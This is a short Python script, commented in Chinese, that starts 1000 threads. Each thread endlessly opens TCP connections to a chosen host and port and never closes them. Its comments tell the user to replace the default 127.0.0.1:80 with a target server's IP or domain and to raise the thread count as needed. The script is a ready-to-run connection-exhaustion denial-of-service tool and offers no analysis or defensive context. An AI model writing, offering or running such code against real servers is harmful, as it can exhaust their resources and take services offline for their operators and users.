import socket
import threading


def create_orphan_connection(host, port):
    while True:
        try:
            # 创建一个 socket 对象
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # 连接到给定的 host 和 port
            s.connect((host, port))
            # 连接后不进行关闭操作，直接终止程序
            print(f"Orphaned connection to {host}:{port} created")
        except Exception as e:
            print(f"Error: {e}")


def start_threads(host, port, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=create_orphan_connection, args=(host, port))
        thread.start()
        threads.append(thread)


# 主机地址和端口
host = ('127.0.0.1')  # 修改为目标服务器的 IP 或域名
port = 80  # 修改为目标服务器的端口
num_threads = 1000  # 可以根据需要调整线程数

start_threads(host, port, num_threads)
